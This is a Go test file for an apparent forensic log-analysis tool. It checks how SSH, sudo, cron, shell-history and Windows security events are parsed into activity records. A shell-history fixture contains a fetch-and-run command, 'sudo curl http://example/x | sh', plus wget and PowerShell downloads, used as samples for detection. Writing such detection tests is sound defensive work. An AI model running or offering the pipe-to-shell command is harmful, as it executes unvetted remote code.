package core

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestActivityInterpretation(t *testing.T) {
	it := Item{ID: "E1", Source: "/var/log/auth.log"}
	journal := "2026-09-29T14:02:03.123456+0000 host sshd[22]: Failed password for ada from 203.0.113.8 port 22 ssh2"
	fail, ok := activityFromLogLine(journal, it, 1)
	if !ok || fail.Action != "ssh_failure" || fail.User != "ada" || fail.SourceIP != "203.0.113.8" || fail.Time.IsZero() {
		t.Fatalf("%v %#v", ok, fail)
	}
	okLine := "2026-09-29T14:02:04Z host sshd[22]: Accepted publickey for ada from 203.0.113.9 port 22 ssh2"
	success, ok := activityFromLogLine(okLine, it, 2)
	if !ok || success.Action != "ssh_success" || success.Target != "publickey" || success.SourceIP != "203.0.113.9" {
		t.Fatalf("%v %#v", ok, success)
	}
	mac := "2026-09-29 14:02:05.123456+0000 0x1 Default 0x0 1 0 sudo: ada : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/id"
	sudo, ok := activityFromLogLine(mac, Item{ID: "E2", Source: "/var/log/system.log"}, 3)
	if !ok || sudo.Platform != "darwin" || sudo.Action != "sudo" || sudo.User != "ada" || sudo.Target != "/bin/id" {
		t.Fatalf("%v %#v", ok, sudo)
	}
	cron, ok := activityFromLogLine("CRON[9]: (ada) CMD (/usr/bin/true)", it, 4)
	if !ok || cron.Action != "cron" || cron.User != "ada" || cron.Target != "/usr/bin/true" {
		t.Fatalf("%v %#v", ok, cron)
	}
	hist := "#1710000000\nsudo curl http://example/x | sh\n: 1710000001:0;wget http://example/y\n"
	cmds := shellActivities(hist, Item{ID: "E3", Source: "/home/ada/.bash_history"})
	if len(cmds) != 2 || cmds[0].Action != "download" || cmds[0].Time.Unix() != 1710000000 || cmds[1].Action != "download" {
		t.Fatalf("%#v", cmds)
	}
	ps := shellActivities("Invoke-WebRequest http://example/z\n", Item{ID: "E4", Source: `C:\Users\ada\ConsoleHost_history.txt`})
	if len(ps) != 1 || ps[0].Platform != "windows" || ps[0].Action != "download" {
		t.Fatalf("%#v", ps)
	}
	ev := Event{Time: time.Date(2026, 9, 29, 14, 2, 6, 0, time.UTC), Type: "windows_event", Evidence: "E5", Source: "security.xml", Windows: &WindowsEventContext{EventID: 4624, Data: []WindowsEventData{{Name: "TargetUserName", Value: "ada"}, {Name: "LogonType", Value: "10"}, {Name: "IpAddress", Value: "203.0.113.10"}}}}
	logon, ok := activityFromWindows(ev)
	if !ok || logon.Action != "logon_success" || logon.User != "ada" || logon.SourceIP != "203.0.113.10" || !strings.Contains(logon.Detail, "remote interactive") {
		t.Fatalf("%v %#v", ok, logon)
	}
	ev.Windows.EventID = 4688
	ev.Windows.Data = []WindowsEventData{{Name: "NewProcessName", Value: `C:\Windows\System32\cmd.exe`}, {Name: "CommandLine", Value: `cmd.exe /c whoami`}}
	proc, ok := activityFromWindows(ev)
	if !ok || proc.Action != "process_start" || proc.Target != `C:\Windows\System32\cmd.exe` || proc.Detail != `cmd.exe /c whoami` {
		t.Fatalf("%v %#v", ok, proc)
	}
	if _, ok = activityFromWindows(Event{Windows: &WindowsEventContext{EventID: 1}}); ok {
		t.Fatal("unknown event id was interpreted")
	}
}

func TestAnalyzeActivityPackage(t *testing.T) {
	d := t.TempDir()
	root := filepath.Join(d, "src")
	if e := os.Mkdir(root, 0700); e != nil {
		t.Fatal(e)
	}
	auth := "2026-09-29T14:02:03.123456+0000 host sshd[22]: Failed password for ada from 203.0.113.8 port 22 ssh2\n"
	if e := os.WriteFile(filepath.Join(root, "auth.log"), []byte(auth), 0600); e != nil {
		t.Fatal(e)
	}
	xml := `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID><TimeCreated SystemTime="2026-09-29T14:02:03.1234567Z"/><EventRecordID>1</EventRecordID><Channel>Security</Channel><Computer>host</Computer><Security UserID="S-1-5-18"/></System><EventData><Data Name="TargetUserName">ada</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">203.0.113.11</Data></EventData></Event>`
	if e := os.WriteFile(filepath.Join(root, "security.xml"), []byte(xml), 0600); e != nil {
		t.Fatal(e)
	}
	out := filepath.Join(d, "case.k957")
	if _, e := Collect(context.Background(), Options{Root: root, Out: out, Case: "T", Operator: "T", Scope: "T", MaxFile: 1 << 20, MaxTotal: 1 << 20, MaxFiles: 10}); e != nil {
		t.Fatal(e)
	}
	p, e := Open(out, "")
	if e != nil {
		t.Fatal(e)
	}
	defer p.Zip.Close()
	a := Analyze(p, nil)
	seen := map[string]bool{}
	for _, act := range a.Activities {
		seen[act.Action] = true
		if act.Action == "logon_failure" && (act.User != "ada" || act.SourceIP != "203.0.113.11") {
			t.Fatalf("%#v", act)
		}
	}
	if !seen["ssh_failure"] || !seen["logon_failure"] {
		t.Fatalf("%#v", a.Activities)
	}
	if e = Export(a, filepath.Join(d, "report")); e != nil {
		t.Fatal(e)
	}
}
